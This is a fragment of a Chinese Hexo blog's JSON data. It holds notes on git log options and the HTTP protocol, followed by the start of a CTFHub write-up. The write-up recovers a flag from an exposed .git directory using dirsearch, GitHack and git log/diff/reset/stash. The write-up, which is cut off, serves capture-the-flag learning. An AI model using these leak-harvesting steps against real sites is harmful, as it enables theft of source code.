<code>-S</code>（俗称“pickaxe”选项，取“用鹤嘴锄在土里捡石头”之意）， 它接受一个字符串参数，并且只会显示那些添加或删除了该字符串的提交。 假设你想找出添加或删除了对某一个特定函数的引用的提交，可以调用：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">$ git log -S function_name<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"git-stash用法小结\"><a href=\"#git-stash用法小结\" class=\"headerlink\" title=\"git-stash用法小结\"></a><a href=\"https://www.cnblogs.com/tocy/p/git-stash-reference.html\" target=\"_blank\" rel=\"noopener\">git-stash用法小结</a></h2>","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h1><ul>\n<li>Leaning from <a href=\"https://git-scm.com/book/zh/v2\" target=\"_blank\" rel=\"noopener\">Git book</a></li>\n</ul>\n<h2 id=\"2-Git-基础\"><a href=\"#2-Git-基础\" class=\"headerlink\" title=\"2. Git 基础\"></a>2. Git 基础</h2><h3 id=\"2-3-Git-基础-查看提交历史\"><a href=\"#2-3-Git-基础-查看提交历史\" class=\"headerlink\" title=\"2.3 Git 基础 - 查看提交历史\"></a>2.3 Git 基础 - 查看提交历史</h3><ul>\n<li><p><code>git log</code> 命令</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013143508.png\" alt=\"image-20201023013143508\"></p>\n<ul>\n<li><p>该命令列出每个提交的 SHA-1 校验值、作者的名字和电子邮件地址、提交时间以及提交说明。</p>\n</li>\n<li><p>不传入任何参数的默认情况下，<code>git log</code> 会按时间先后顺序列出所有的提交，最近的更新排在最上面。</p>\n</li>\n<li><p>选项 <code>-p</code> 或 <code>--patch</code> 。它会显示每次提交所引入的差异（按 <strong>补丁</strong> 的格式输出），你也可以限制显示的日志条目数量，例如使用 <code>-2</code> 选项来只显示最近的两次提交。<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013249918.png\" alt=\"image-20201023013249918\"></p>\n</li>\n<li><p>选项 <code>--stat</code> 。当进行代码审查，或者快速浏览某个搭档的提交所带来的变化的时候，这个参数就非常有用了。你也可以为 <code>git log</code> 附带一系列的总结性选项。 比如你想看到每次提交的简略统计信息：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013424138.png\" alt=\"image-20201023013424138\">正如你所看到的，<code>--stat</code> 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。</p>\n</li>\n<li><p>选项 <code>--pretty</code>。这个选项可以使用<strong>不同于默认格式</strong>的方式展示提交历史。 这个选项有一些内建的子选项供你使用。</p>\n<ul>\n<li><p>比如 <code>oneline</code> 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 另外还有 <code>short</code>，<code>full</code> 和 <code>fuller</code> 子选项，与<code>oneline</code>展示信息的格式基本一致，详尽程度不一。<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013831955.png\" alt=\"image-20201023013831955\"></p>\n</li>\n<li><p>子选项 <code>format</code> ，可以定制记录的显示格式<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201023014446505.png\" alt=\"image-20201023014446505\"><code>format</code> 接受的常用格式占位符的写法及其代表的意义可参考官方文档<a href=\"https://git-scm.com/book/zh/v2/ch00/pretty_format\" target=\"_blank\" rel=\"noopener\">常用的选项</a></p>\n</li>\n</ul>\n</li>\n<li><p><code>--since</code> 和 <code>--until</code> 这种按照时间作限制的选项很有用。 例如，下面的命令会列出最近两周的所有提交：</p>\n<pre><code class=\"shell\">$ git log --since=2.weeks</code></pre>\n<p>该命令可用的格式十分丰富——可以是类似 <code>&quot;2008-01-15&quot;</code> 的具体的某一天，也可以是类似 <code>&quot;2 years 1 day 3 minutes ago&quot;</code> 的相对日期。</p>\n</li>\n<li><p><code>--author</code> 选项显示指定作者的提交.</p>\n</li>\n<li><p><code>--grep</code> 选项搜索提交说明中的关键字。</p>\n</li>\n<li><p>另一个非常有用的过滤器是 <code>-S</code>（俗称“pickaxe”选项，取“用鹤嘴锄在土里捡石头”之意）， 它接受一个字符串参数，并且只会显示那些添加或删除了该字符串的提交。 假设你想找出添加或删除了对某一个特定函数的引用的提交，可以调用：</p>\n<pre><code class=\"shell\">$ git log -S function_name</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"git-stash用法小结\"><a href=\"#git-stash用法小结\" class=\"headerlink\" title=\"git-stash用法小结\"></a><a href=\"https://www.cnblogs.com/tocy/p/git-stash-reference.html\" target=\"_blank\" rel=\"noopener\">git-stash用法小结</a></h2>"},{"title":"HTTP协议","date":"2021-09-10T06:01:10.023Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# HTTP协议\n\n## **重要性**\n\n- *无论是以后用webservice，还是用rest做大型架构，都离不开对HTTP协议的认识。*\n\n- *甚至可以简化地说：*\n  *ebService = HTTP协议 + XML*\n  *Rest = HTTP协议 + json*\n  *各种API也一般是用HTTP + XML/json来实现的*\n\n- *在对HTTP协议有了了解之后，学习Ajax是非常容易理解的*\n\n## **什么是协议**\n\n- *计算机中的协议和现实中的协议是一样的，一式双份/多份。双方/多方都遵从共同的一个规范，这个规范就可以称为协议。*\n\n- <u>ftp、http、stmp、pop、tcp/ip协议</u>\n\n## **什么是http协议**\n\n- *http协议即按照一定规则，向服务器请求数据或发送数据，而服务器按一定规则返回数据。*\n\n##   **HTTP工作流程**\n\n- ![wps1](https://gitee.com/h1ler/tuci/raw/master/null/wps1.png)\n\n## **HTTP请求信息和响应信息的格式**\n\n![](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160038988.png)\n\n![image-20200728160443257](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160443257.png)\n\n- 请求：\n  \n  \n  \n  - 请求行\n    - 请求方法\n      - GET\n      \n      - POST\n      \n        与GET基本一致，只是不返回内容。\n      \n        例如我们只是确认一个内容（例如照片）是否正常存在，不需要返回照片内容，则用HEAD\n      \n      - HEAD\n      \n      - PUT\n      \n      - DELETE\n      \n      - TRACE\n      \n        当使用代理上网时，用代理访问new.163.com，用TRACE可以测试代理是否修改你的HTTP请求，163.com的服务器会将最后收到的请求返回\n      \n      - OPTIONS\n      \n        返回服务器可用的请求方法\n      \n      >  注意：这些请求方法虽然HTTP协议里规定的，但WebService未必允许或支持这些方法\n      \n    - 请求路径\n    \n    - 所用的协议\n    \n      目前一般是HTTP/1.1，而0.9和10版本已经基本不用。\n    \n  - 请求头信息\n  \n    - 格式  Key:Value\n  \n    - Host\n  \n    - User-agent:    用户代理  \n  \n      向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识（爬虫可利用此伪装成用户）\n  \n    - Referer    告诉服务器该网页是从哪个页面链接过来的\n  \n    - X-Forwarded-For    用来识别通过[HTTP](https://baike.baidu.com/item/HTTP)[代理](https://baike.baidu.com/item/代理)或[负载均衡](https://baike.baidu.com/item/负载均衡)方式连接到[Web服务器](https://baike.baidu.com/item/Web服务器)的客户端最原始的[IP地址](https://baike.baidu.com/item/IP地址)的HTTP请求头字段(可利用伪造任意的IP地址)\n  \n    - Content-Type\n  \n    - Content-Length    接下来主体的长度\n  \n  - 请求主体信息（可选）\n\n> 问：浏览器能发送HTTP协议，HTTP协议一定要浏览器来发送吗？\n>\n> 答：不是，HTTP既然是一种协议，那么只要满足这种协议，什么工具都可以发。\n\n- 响应：\n\n  - 响应行\n\n    - 协议\n    - 状态码\n    - 状态文字\n\n  - 响应头信息\n\n    - 格式  Key:Value\n\n    - Content-Type\n    - Content-Length    接下来主体的长度\n\n  - 响应主体信息(也可能没有)\n\n> 作业：用telnet来完成HTTP协议的POST请求\n>\n> ![image-20200728164614323](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728164614323.png)\n\n\n\n![image-20200729004054696](https://gitee.com/h1ler/tuci/raw/master/null/hLj2cPlvxSo79EH.png)\n\n## **状态码，状态文字**\n\n状态码是用来反应服务器响应情况的。\n\n最常见的如 200 OK，404 NOT FOUND\n\n![image-20200729011518611](https://gitee.com/h1ler/tuci/raw/master/null/image-20200729011518611.png)\n\n- 常见状态码\n\n  200\t-\t服务器成功返回页面\n\n  301/302\t-\t永久/临时重定向\n\n  304 NOT Modified\t-\t未修改\n\n  **307\t-\t重定向中保持原有的请求数据**\n\n  失败的状态码：\n\n  404\t-\t请求的网页不存在\n\n  503\t-\t服务器暂时不可用\n  \n  500\t-\t服务器内部错误","source":"_posts/HTTP协议.md","raw":"---\ntitle: HTTP协议\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: 计算机网络\ncategories: 计算机网络\n---\n\n\n\n# HTTP协议\n\n## **重要性**\n\n- *无论是以后用webservice，还是用rest做大型架构，都离不开对HTTP协议的认识。*\n\n- *甚至可以简化地说：*\n  *ebService = HTTP协议 + XML*\n  *Rest = HTTP协议 + json*\n  *各种API也一般是用HTTP + XML/json来实现的*\n\n- *在对HTTP协议有了了解之后，学习Ajax是非常容易理解的*\n\n## **什么是协议**\n\n- *计算机中的协议和现实中的协议是一样的，一式双份/多份。双方/多方都遵从共同的一个规范，这个规范就可以称为协议。*\n\n- <u>ftp、http、stmp、pop、tcp/ip协议</u>\n\n## **什么是http协议**\n\n- *http协议即按照一定规则，向服务器请求数据或发送数据，而服务器按一定规则返回数据。*\n\n##   **HTTP工作流程**\n\n- ![wps1](https://gitee.com/h1ler/tuci/raw/master/null/wps1.png)\n\n## **HTTP请求信息和响应信息的格式**\n\n![](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160038988.png)\n\n![image-20200728160443257](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160443257.png)\n\n- 请求：\n  \n  \n  \n  - 请求行\n    - 请求方法\n      - GET\n      \n      - POST\n      \n        与GET基本一致，只是不返回内容。\n      \n        例如我们只是确认一个内容（例如照片）是否正常存在，不需要返回照片内容，则用HEAD\n      \n      - HEAD\n      \n      - PUT\n      \n      - DELETE\n      \n      - TRACE\n      \n        当使用代理上网时，用代理访问new.163.com，用TRACE可以测试代理是否修改你的HTTP请求，163.com的服务器会将最后收到的请求返回\n      \n      - OPTIONS\n      \n        返回服务器可用的请求方法\n      \n      >  注意：这些请求方法虽然HTTP协议里规定的，但WebService未必允许或支持这些方法\n      \n    - 请求路径\n    \n    - 所用的协议\n    \n      目前一般是HTTP/1.1，而0.9和10版本已经基本不用。\n    \n  - 请求头信息\n  \n    - 格式  Key:Value\n  \n    - Host\n  \n    - User-agent:    用户代理  \n  \n      向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识（爬虫可利用此伪装成用户）\n  \n    - Referer    告诉服务器该网页是从哪个页面链接过来的\n  \n    - X-Forwarded-For    用来识别通过[HTTP](https://baike.baidu.com/item/HTTP)[代理](https://baike.baidu.com/item/代理)或[负载均衡](https://baike.baidu.com/item/负载均衡)方式连接到[Web服务器](https://baike.baidu.com/item/Web服务器)的客户端最原始的[IP地址](https://baike.baidu.com/item/IP地址)的HTTP请求头字段(可利用伪造任意的IP地址)\n  \n    - Content-Type\n  \n    - Content-Length    接下来主体的长度\n  \n  - 请求主体信息（可选）\n\n> 问：浏览器能发送HTTP协议，HTTP协议一定要浏览器来发送吗？\n>\n> 答：不是，HTTP既然是一种协议，那么只要满足这种协议，什么工具都可以发。\n\n- 响应：\n\n  - 响应行\n\n    - 协议\n    - 状态码\n    - 状态文字\n\n  - 响应头信息\n\n    - 格式  Key:Value\n\n    - Content-Type\n    - Content-Length    接下来主体的长度\n\n  - 响应主体信息(也可能没有)\n\n> 作业：用telnet来完成HTTP协议的POST请求\n>\n> ![image-20200728164614323](https://gitee.com/h1ler/tuci/raw/master/null/image-20200728164614323.png)\n\n\n\n![image-20200729004054696](https://gitee.com/h1ler/tuci/raw/master/null/hLj2cPlvxSo79EH.png)\n\n## **状态码，状态文字**\n\n状态码是用来反应服务器响应情况的。\n\n最常见的如 200 OK，404 NOT FOUND\n\n![image-20200729011518611](https://gitee.com/h1ler/tuci/raw/master/null/image-20200729011518611.png)\n\n- 常见状态码\n\n  200\t-\t服务器成功返回页面\n\n  301/302\t-\t永久/临时重定向\n\n  304 NOT Modified\t-\t未修改\n\n  **307\t-\t重定向中保持原有的请求数据**\n\n  失败的状态码：\n\n  404\t-\t请求的网页不存在\n\n  503\t-\t服务器暂时不可用\n  \n  500\t-\t服务器内部错误","slug":"HTTP协议","published":1,"updated":"2021-07-27T03:37:55.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydo000kt8op0pu294ih","content":"<h1 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h1><h2 id=\"重要性\"><a href=\"#重要性\" class=\"headerlink\" title=\"重要性\"></a><strong>重要性</strong></h2><ul>\n<li><p><em>无论是以后用webservice，还是用rest做大型架构，都离不开对HTTP协议的认识。</em></p>\n</li>\n<li><p><em>甚至可以简化地说：</em><br><em>ebService = HTTP协议 + XML</em><br><em>Rest = HTTP协议 + json</em><br><em>各种API也一般是用HTTP + XML/json来实现的</em></p>\n</li>\n<li><p><em>在对HTTP协议有了了解之后，学习Ajax是非常容易理解的</em></p>\n</li>\n</ul>\n<h2 id=\"什么是协议\"><a href=\"#什么是协议\" class=\"headerlink\" title=\"什么是协议\"></a><strong>什么是协议</strong></h2><ul>\n<li><p><em>计算机中的协议和现实中的协议是一样的，一式双份/多份。双方/多方都遵从共同的一个规范，这个规范就可以称为协议。</em></p>\n</li>\n<li><p><u>ftp、http、stmp、pop、tcp/ip协议</u></p>\n</li>\n</ul>\n<h2 id=\"什么是http协议\"><a href=\"#什么是http协议\" class=\"headerlink\" title=\"什么是http协议\"></a><strong>什么是http协议</strong></h2><ul>\n<li><em>http协议即按照一定规则，向服务器请求数据或发送数据，而服务器按一定规则返回数据。</em></li>\n</ul>\n<h2 id=\"HTTP工作流程\"><a href=\"#HTTP工作流程\" class=\"headerlink\" title=\"HTTP工作流程\"></a><strong>HTTP工作流程</strong></h2><ul>\n<li><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/wps1.png\" alt=\"wps1\"></li>\n</ul>\n<h2 id=\"HTTP请求信息和响应信息的格式\"><a href=\"#HTTP请求信息和响应信息的格式\" class=\"headerlink\" title=\"HTTP请求信息和响应信息的格式\"></a><strong>HTTP请求信息和响应信息的格式</strong></h2><p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160038988.png\" alt=\"\"></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160443257.png\" alt=\"image-20200728160443257\"></p>\n<ul>\n<li>请求：</li>\n</ul>\n<ul>\n<li><p>请求行</p>\n<ul>\n<li><p>请求方法</p>\n<ul>\n<li><p>GET</p>\n</li>\n<li><p>POST</p>\n<p>与GET基本一致，只是不返回内容。</p>\n<p>例如我们只是确认一个内容（例如照片）是否正常存在，不需要返回照片内容，则用HEAD</p>\n</li>\n<li><p>HEAD</p>\n</li>\n<li><p>PUT</p>\n</li>\n<li><p>DELETE</p>\n</li>\n<li><p>TRACE</p>\n<p>当使用代理上网时，用代理访问new.163.com，用TRACE可以测试代理是否修改你的HTTP请求，163.com的服务器会将最后收到的请求返回</p>\n</li>\n<li><p>OPTIONS</p>\n<p>返回服务器可用的请求方法</p>\n</li>\n</ul>\n<blockquote>\n<p> 注意：这些请求方法虽然HTTP协议里规定的，但WebService未必允许或支持这些方法</p>\n</blockquote>\n</li>\n<li><p>请求路径</p>\n</li>\n<li><p>所用的协议</p>\n<p>目前一般是HTTP/1.1，而0.9和10版本已经基本不用。</p>\n</li>\n</ul>\n</li>\n<li><p>请求头信息</p>\n<ul>\n<li><p>格式  Key:Value</p>\n</li>\n<li><p>Host</p>\n</li>\n<li><p>User-agent:    用户代理  </p>\n<p>向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识（爬虫可利用此伪装成用户）</p>\n</li>\n<li><p>Referer    告诉服务器该网页是从哪个页面链接过来的</p>\n</li>\n<li><p>X-Forwarded-For    用来识别通过<a href=\"https://baike.baidu.com/item/HTTP\" target=\"_blank\" rel=\"noopener\">HTTP</a><a href=\"https://baike.baidu.com/item/代理\" target=\"_blank\" rel=\"noopener\">代理</a>或<a href=\"https://baike.baidu.com/item/负载均衡\" target=\"_blank\" rel=\"noopener\">负载均衡</a>方式连接到<a href=\"https://baike.baidu.com/item/Web服务器\" target=\"_blank\" rel=\"noopener\">Web服务器</a>的客户端最原始的<a href=\"https://baike.baidu.com/item/IP地址\" target=\"_blank\" rel=\"noopener\">IP地址</a>的HTTP请求头字段(可利用伪造任意的IP地址)</p>\n</li>\n<li><p>Content-Type</p>\n</li>\n<li><p>Content-Length    接下来主体的长度</p>\n</li>\n</ul>\n</li>\n<li><p>请求主体信息（可选）</p>\n</li>\n</ul>\n<blockquote>\n<p>问：浏览器能发送HTTP协议，HTTP协议一定要浏览器来发送吗？</p>\n<p>答：不是，HTTP既然是一种协议，那么只要满足这种协议，什么工具都可以发。</p>\n</blockquote>\n<ul>\n<li><p>响应：</p>\n<ul>\n<li><p>响应行</p>\n<ul>\n<li>协议</li>\n<li>状态码</li>\n<li>状态文字</li>\n</ul>\n</li>\n<li><p>响应头信息</p>\n<ul>\n<li><p>格式  Key:Value</p>\n</li>\n<li><p>Content-Type</p>\n</li>\n<li><p>Content-Length    接下来主体的长度</p>\n</li>\n</ul>\n</li>\n<li><p>响应主体信息(也可能没有)</p>\n</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>作业：用telnet来完成HTTP协议的POST请求</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728164614323.png\" alt=\"image-20200728164614323\"></p>\n</blockquote>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/hLj2cPlvxSo79EH.png\" alt=\"image-20200729004054696\"></p>\n<h2 id=\"状态码，状态文字\"><a href=\"#状态码，状态文字\" class=\"headerlink\" title=\"状态码，状态文字\"></a><strong>状态码，状态文字</strong></h2><p>状态码是用来反应服务器响应情况的。</p>\n<p>最常见的如 200 OK，404 NOT FOUND</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200729011518611.png\" alt=\"image-20200729011518611\"></p>\n<ul>\n<li><p>常见状态码</p>\n<p>200    -    服务器成功返回页面</p>\n<p>301/302    -    永久/临时重定向</p>\n<p>304 NOT Modified    -    未修改</p>\n<p><strong>307    -    重定向中保持原有的请求数据</strong></p>\n<p>失败的状态码：</p>\n<p>404    -    请求的网页不存在</p>\n<p>503    -    服务器暂时不可用</p>\n<p>500    -    服务器内部错误</p>\n</li>\n</ul>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h1><h2 id=\"重要性\"><a href=\"#重要性\" class=\"headerlink\" title=\"重要性\"></a><strong>重要性</strong></h2><ul>\n<li><p><em>无论是以后用webservice，还是用rest做大型架构，都离不开对HTTP协议的认识。</em></p>\n</li>\n<li><p><em>甚至可以简化地说：</em><br><em>ebService = HTTP协议 + XML</em><br><em>Rest = HTTP协议 + json</em><br><em>各种API也一般是用HTTP + XML/json来实现的</em></p>\n</li>\n<li><p><em>在对HTTP协议有了了解之后，学习Ajax是非常容易理解的</em></p>\n</li>\n</ul>\n<h2 id=\"什么是协议\"><a href=\"#什么是协议\" class=\"headerlink\" title=\"什么是协议\"></a><strong>什么是协议</strong></h2><ul>\n<li><p><em>计算机中的协议和现实中的协议是一样的，一式双份/多份。双方/多方都遵从共同的一个规范，这个规范就可以称为协议。</em></p>\n</li>\n<li><p><u>ftp、http、stmp、pop、tcp/ip协议</u></p>\n</li>\n</ul>\n<h2 id=\"什么是http协议\"><a href=\"#什么是http协议\" class=\"headerlink\" title=\"什么是http协议\"></a><strong>什么是http协议</strong></h2><ul>\n<li><em>http协议即按照一定规则，向服务器请求数据或发送数据，而服务器按一定规则返回数据。</em></li>\n</ul>\n<h2 id=\"HTTP工作流程\"><a href=\"#HTTP工作流程\" class=\"headerlink\" title=\"HTTP工作流程\"></a><strong>HTTP工作流程</strong></h2><ul>\n<li><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/wps1.png\" alt=\"wps1\"></li>\n</ul>\n<h2 id=\"HTTP请求信息和响应信息的格式\"><a href=\"#HTTP请求信息和响应信息的格式\" class=\"headerlink\" title=\"HTTP请求信息和响应信息的格式\"></a><strong>HTTP请求信息和响应信息的格式</strong></h2><p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160038988.png\" alt=\"\"></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160443257.png\" alt=\"image-20200728160443257\"></p>\n<ul>\n<li>请求：</li>\n</ul>\n<ul>\n<li><p>请求行</p>\n<ul>\n<li><p>请求方法</p>\n<ul>\n<li><p>GET</p>\n</li>\n<li><p>POST</p>\n<p>与GET基本一致，只是不返回内容。</p>\n<p>例如我们只是确认一个内容（例如照片）是否正常存在，不需要返回照片内容，则用HEAD</p>\n</li>\n<li><p>HEAD</p>\n</li>\n<li><p>PUT</p>\n</li>\n<li><p>DELETE</p>\n</li>\n<li><p>TRACE</p>\n<p>当使用代理上网时，用代理访问new.163.com，用TRACE可以测试代理是否修改你的HTTP请求，163.com的服务器会将最后收到的请求返回</p>\n</li>\n<li><p>OPTIONS</p>\n<p>返回服务器可用的请求方法</p>\n</li>\n</ul>\n<blockquote>\n<p> 注意：这些请求方法虽然HTTP协议里规定的，但WebService未必允许或支持这些方法</p>\n</blockquote>\n</li>\n<li><p>请求路径</p>\n</li>\n<li><p>所用的协议</p>\n<p>目前一般是HTTP/1.1，而0.9和10版本已经基本不用。</p>\n</li>\n</ul>\n</li>\n<li><p>请求头信息</p>\n<ul>\n<li><p>格式  Key:Value</p>\n</li>\n<li><p>Host</p>\n</li>\n<li><p>User-agent:    用户代理  </p>\n<p>向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识（爬虫可利用此伪装成用户）</p>\n</li>\n<li><p>Referer    告诉服务器该网页是从哪个页面链接过来的</p>\n</li>\n<li><p>X-Forwarded-For    用来识别通过<a href=\"https://baike.baidu.com/item/HTTP\" target=\"_blank\" rel=\"noopener\">HTTP</a><a href=\"https://baike.baidu.com/item/代理\" target=\"_blank\" rel=\"noopener\">代理</a>或<a href=\"https://baike.baidu.com/item/负载均衡\" target=\"_blank\" rel=\"noopener\">负载均衡</a>方式连接到<a href=\"https://baike.baidu.com/item/Web服务器\" target=\"_blank\" rel=\"noopener\">Web服务器</a>的客户端最原始的<a href=\"https://baike.baidu.com/item/IP地址\" target=\"_blank\" rel=\"noopener\">IP地址</a>的HTTP请求头字段(可利用伪造任意的IP地址)</p>\n</li>\n<li><p>Content-Type</p>\n</li>\n<li><p>Content-Length    接下来主体的长度</p>\n</li>\n</ul>\n</li>\n<li><p>请求主体信息（可选）</p>\n</li>\n</ul>\n<blockquote>\n<p>问：浏览器能发送HTTP协议，HTTP协议一定要浏览器来发送吗？</p>\n<p>答：不是，HTTP既然是一种协议，那么只要满足这种协议，什么工具都可以发。</p>\n</blockquote>\n<ul>\n<li><p>响应：</p>\n<ul>\n<li><p>响应行</p>\n<ul>\n<li>协议</li>\n<li>状态码</li>\n<li>状态文字</li>\n</ul>\n</li>\n<li><p>响应头信息</p>\n<ul>\n<li><p>格式  Key:Value</p>\n</li>\n<li><p>Content-Type</p>\n</li>\n<li><p>Content-Length    接下来主体的长度</p>\n</li>\n</ul>\n</li>\n<li><p>响应主体信息(也可能没有)</p>\n</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>作业：用telnet来完成HTTP协议的POST请求</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200728164614323.png\" alt=\"image-20200728164614323\"></p>\n</blockquote>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/hLj2cPlvxSo79EH.png\" alt=\"image-20200729004054696\"></p>\n<h2 id=\"状态码，状态文字\"><a href=\"#状态码，状态文字\" class=\"headerlink\" title=\"状态码，状态文字\"></a><strong>状态码，状态文字</strong></h2><p>状态码是用来反应服务器响应情况的。</p>\n<p>最常见的如 200 OK，404 NOT FOUND</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20200729011518611.png\" alt=\"image-20200729011518611\"></p>\n<ul>\n<li><p>常见状态码</p>\n<p>200    -    服务器成功返回页面</p>\n<p>301/302    -    永久/临时重定向</p>\n<p>304 NOT Modified    -    未修改</p>\n<p><strong>307    -    重定向中保持原有的请求数据</strong></p>\n<p>失败的状态码：</p>\n<p>404    -    请求的网页不存在</p>\n<p>503    -    服务器暂时不可用</p>\n<p>500    -    服务器内部错误</p>\n</li>\n</ul>\n"},{"title":"Git泄露","date":"2021-09-10T06:01:09.813Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# CTFHub-Git泄露\n\n一般思路：用dirsearch扫描发现git泄露\n\n![image-20201023023245829](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023245829.png)\n\n![image-20201023023226766](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023226766.png)\n\n## Log\n\n- 知识点：详见[Git 基础 - 查看提交历史](https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2)、[git diff](https://git-scm.com/docs/git-diff)\n\n- 使用GitHack工具处理Git泄露情况![image-20201023023626635](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023626635.png)\n\n- 切换到爬下来的目录中用`git log`查看日志![image-20201023024006671](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024006671.png)\n\n- 得到Flag\n\n  - 方法一：发现提交说明中有add flag，利用`git diff`来查看commits之间的不同![image-20201023024655911](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024655911.png)\n\n  - 方法二：用`git reset --hard`退回提交说明为add flag的版本![image-20201023024951095](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024951095.png)\n\n    即可将add flag版本克隆在本地文件夹中![image-20201023025225404](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025225404.png)\n\n## Stash\n\n- 知识点：[git-stash用法小结](https://www.cnblogs.com/tocy/p/git-stash-reference.html)\n- 操作同上，进入文件夹后使用`git log`![image-20201023025747482](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025747482.png)\n- `git diff`并没有flag信息![image-20201023025905370](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025905370.png)\n- `git stash list`操作，查看现有stash![image-20201023030022983](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030022983.png)\n- `git stash apply`重新应用缓存的stash![image-20201023030151666](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030151666.png)\n- `git diff`重新比对得到flag![image-20201023030323906](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030323906.png)\n\n## Index\n\n","source":"_posts/Git泄露.md","raw":"---\ntitle: Git泄露\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: Git\ncategories: Git\n---\n\n\n\n# CTFHub-Git泄露\n\n一般思路：用dirsearch扫描发现git泄露\n\n![image-20201023023245829](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023245829.png)\n\n![image-20201023023226766](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023226766.png)\n\n## Log\n\n- 知识点：详见[Git 基础 - 查看提交历史](https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2)、[git diff](https://git-scm.com/docs/git-diff)\n\n- 使用GitHack工具处理Git泄露情况![image-20201023023626635](https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023626635.png)\n\n- 切换到爬下来的目录中用`git 